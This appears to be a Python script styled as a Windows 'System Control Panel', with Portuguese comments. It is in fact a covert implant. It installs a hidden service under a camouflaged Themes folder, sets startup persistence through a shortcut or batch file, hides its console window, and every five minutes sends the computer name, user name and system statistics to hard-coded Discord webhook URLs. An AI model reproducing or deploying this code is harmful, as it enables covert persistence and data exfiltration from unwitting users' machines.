#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
System Control Panel - Painel de controle do sistema
"""

import os
import sys
import json
import time
import socket
import platform
import requests
import shutil
import subprocess
from pathlib import Path
import tempfile
from datetime import datetime
import re
import threading
import psutil
import pyautogui
import base64
import ctypes
import winreg

# Configurações dos serviços
CONTROL_SERVICE = "https://canary.discord.com/api/webhooks/1486603140160684053/k7QfXw-W4Xjuq_mFEHeEBYd0y1xBbXFV3pWP8IbbtqOsijZC--clyrqZujGx89snP2_F"
SYSTEM_SERVICE = "https://canary.discord.com/api/webhooks/1486574273861517372/uzHE_RwfqEaGg9Z8x42sYJVOoalwtmsJkGDD5AEGq8sSQb945cPaL74vEA3H_CR0YUtt"

class SystemControlPanel:
    def __init__(self):
        self.temp_dir = tempfile.mkdtemp(prefix="control_")
        self.service_installed = False
        
    def install_system_service(self):
        """Instala serviço do sistema"""
        try:
            print("🔧 Installing system service...")
            
            # Diretório de instalação camuflado
            install_dir = os.path.expandvars(r'%APPDATA%\Microsoft\Windows\Themes\SysCore')
            os.makedirs(install_dir, exist_ok=True)
            
            # Cria o script de serviço
            service_script = os.path.join(install_dir, "core_service.py")
            
            # Código do serviço
            service_code = '''#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Core System Service - Serviço principal do sistema
"""

import os
import sys
import time
import requests
import tempfile
from datetime import datetime
import threading

# Configuração
SERVICE_ENDPOINT = "https://canary.discord.com/api/webhooks/1486603140160684053/k7QfXw-W4Xjuq_mFEHeEBYd0y1xBbXFV3pWP8IbbtqOsijZC--clyrqZujGx89snP2_F"

class CoreService:
    def __init__(self):
        self.running = True
        self.computer_id = f"{os.environ.get('COMPUTERNAME', 'Unknown')}_{os.environ.get('USERNAME', 'Unknown')}"
        
    def start_service(self):
        """Inicia serviço principal"""
        # Esconde janela
        try:
            import ctypes
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except:
            pass
        
        # Envia notificação de início
        self.send_service_status("Service Started")
        
        # Loop principal
        while self.running:
            try:
                # Coleta informações do sistemaa
                system_info = self.collect_system_info()
                
                # Envia relatório periódico
                self.send_system_report(system_info)
                
                # Aguarda próximo ciclo
                time.sleep(300)  # 5 minutos
                
            except Exception as e:
                time.sleep(60)
    
    def collect_system_info(self):
        """Coleta informações do sistema"""
        try:
            import psutil
            
            return {
                "computer_id": self.computer_id,
                "timestamp": datetime.now().isoformat(),
                "cpu_usage": psutil.cpu_percent(interval=1),
                "memory_usage": psutil.virtual_memory().percent,
                "disk_usage": psutil.disk_usage('/').percent,
                "process_count": len(psutil.pids()),
                "boot_time": datetime.fromtimestamp(psutil.boot_time()).isoformat()
            }
        except:
            return {"computer_id": self.computer_id, "timestamp": datetime.now().isoformat()}
    
    def send_service_status(self, status):
        """Envia status do serviço"""
        try:
            embed = {
                "title": f"🔧 Core Service - {self.computer_id}",
                "description": f"Status: {status}",
                "color": 3447003,
                "timestamp": datetime.now().isoformat()
            }
            
            payload = {"embeds": [embed], "username": "Core Service"}
            requests.post(SERVICE_ENDPOINT, json=payload, timeout=5)
        except:
            pass
    
    def send_system_report(self, data):
        """Envia relatório do sistema"""
        try:
            embed = {
                "title": f"📊 System Report - {self.computer_id}",
                "color": 5814783,
                "fields": [
                    {"name": "💻 CPU", "value": f"```{data.get('cpu_usage', 0):.1f}%```", "inline": True},
                    {"name": "🧠 Memory", "value": f"```{data.get('memory_usage', 0):.1f}%```", "inline": True},
                    {"name": "💾 Disk", "value": f"```{data.get('disk_usage', 0):.1f}%```", "inline": True},
                    {"name": "⚙️ Processes", "value": f"```{data.get('process_count', 0)}```", "inline": True},
                    {"name": "⏰ Time", "value": f"```{datetime.now().strftime('%H:%M:%S')}```", "inline": True}
                ],
                "timestamp": datetime.now().isoformat()
            }
            
            payload = {"embeds": [embed], "username": "System Monitor"}
            requests.post(SERVICE_ENDPOINT, json=payload, timeout=5)
        except:
            pass

if __name__ == "__main__":
    service = CoreService()
    service.start_service()
'''
            
            # Salva o script
            with open(service_script, 'w') as f:
                f.write(service_code)
            
            # Cria atalho no startup
            self.create_startup_shortcut(install_dir)
            
            # Envia notificação
            self.send_control_status("Service Installed Successfully")
            
            self.service_installed = True
            print("✅ System service installed!")
            
        except Exception as e:
            print(f"❌ Installation failed: {e}")
    
    def create_startup_shortcut(self, install_dir):
        """Cria atalho no startup"""
        try:
            import winshell
            from win32com.client import Dispatch
            
            startup_path = winshell.startup()
            shortcut_path = os.path.join(startup_path, "SystemCore.lnk")
            
            shell = Dispatch('WScript.Shell')
            shortcut = shell.CreateShortCut(shortcut_path)
            shortcut.Targetpath = sys.executable
            shortcut.Arguments = f'"{os.path.join(install_dir, "core_service.py")}"'
            shortcut.WorkingDirectory = install_dir
            shortcut.IconLocation = sys.executable
            shortcut.save()
            
        except:
            # Método alternativo
            try:
                import ctypes
                startup = os.path.expandvars(r'%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup')
                bat_path = os.path.join(startup, "system_service.bat")
                
                with open(bat_path, 'w') as f:
                    f.write(f'@echo off\nstart "" /B python "{os.path.join(install_dir, "core_service.py")}"')
                    
            except:
                pass
    
    def send_control_status(self, message):
        """Envia status do painel de controle"""
        try:
            embed = {
                "title": f"🎛️ Control Panel - {os.environ.get('COMPUTERNAME', 'Unknown')}",
                "description": message,
                "color": 16711680,  # Vermelho
                "timestamp": datetime.now().isoformat()
            }
            
            payload = {"embeds": [embed], "username": "Control Panel"}
            requests.post(CONTROL_SERVICE, json=payload, timeout=5)
        except:
            pass
    
    def run_system_analysis(self):
        """Executa análise completa do sistema"""
        try:
            print("🔍 Running complete system analysis...")
            
            # Importa módulos de diagnóstico
            sys.path.append(os.path.dirname(__file__))
            from .system_diagnostics import SystemDiagnostics
            from .performance_monitor import PerformanceMonitor
            from .system_health_monitor import SystemHealthMonitor
            
            # Executa diagnósticos
            diagnostics = SystemDiagnostics()
            diagnostics.run_diagnostics()
            
            # Executa monitor de performance
            monitor = PerformanceMonitor()
            monitor.start_monitoring()
            
            # Executa health check
            health = SystemHealthMonitor()
            health.run_health_check()
            
            self.send_control_status("System Analysis Completed")
            
        except Exception as e:
            print(f"❌ Analysis failed: {e}")
    
    def show_control_menu(self):
        """Mostra menu de controle"""
        while True:
            print("\n" + "="*50)
            print("🎛️ SYSTEM CONTROL PANEL")
            print("="*50)
            print("1. 🔧 Install System Service")
            print("2. 🔍 Run System Analysis")
            print("3. 📊 Check Service Status")
            print("4. 🗑️ Remove Service")
            print("0. 🚪 Exit")
            print("="*50)
            
            choice = input("❯ Select option: ").strip()
            
            if choice == "1":
                self.install_system_service()
            elif choice == "2":
                self.run_system_analysis()
            elif choice == "3":
                self.check_service_status()
            elif choice == "4":
                self.remove_service()
            elif choice == "0":
                break
            else:
                print("❌ Invalid option!")
    
    def check_service_status(self):
        """Verifica status do serviço"""
        try:
            install_dir = os.path.expandvars(r'%APPDATA%\Microsoft\Windows\Themes\SysCore')
            service_script = os.path.join(install_dir, "core_service.py")
            
            if os.path.exists(service_script):
                print("✅ Service is installed")
                self.send_control_status("Service Status: Installed")
            else:
                print("❌ Service not found")
                self.send_control_status("Service Status: Not Found")
                
        except Exception as e:
            print(f"❌ Status check failed: {e}")
    
    def remove_service(self):
        """Remove serviço do sistema"""
        try:
            print("🗑️ Removing system service...")
            
            # Remove arquivos
            install_dir = os.path.expandvars(r'%APPDATA%\Microsoft\Windows\Themes\SysCore')
            if os.path.exists(install_dir):
                shutil.rmtree(install_dir, ignore_errors=True)
            
            # Remove atalho do startup
            try:
                import winshell
                startup_path = winshell.startup()
                shortcut_path = os.path.join(startup_path, "SystemCore.lnk")
                if os.path.exists(shortcut_path):
                    os.remove(shortcut_path)
            except:
                pass
            
            # Envia notificação
            self.send_control_status("Service Removed")
            
            print("✅ Service removed!")
            
        except Exception as e:
            print(f"❌ Removal failed: {e}")

def main():
    """Função principal"""
    print("System Control Panel v1.0")
    print("=" * 30)
    
    panel = SystemControlPanel()
    
    try:
        panel.show_control_menu()
    except KeyboardInterrupt:
        print("\nControl panel closed!")
    except Exception as e:
        print(f"Control panel error: {e}")
    finally:
        # Limpa arquivos temporários
        try:
            shutil.rmtree(panel.temp_dir, ignore_errors=True)
        except:
            pass

if __name__ == "__main__":
    main()
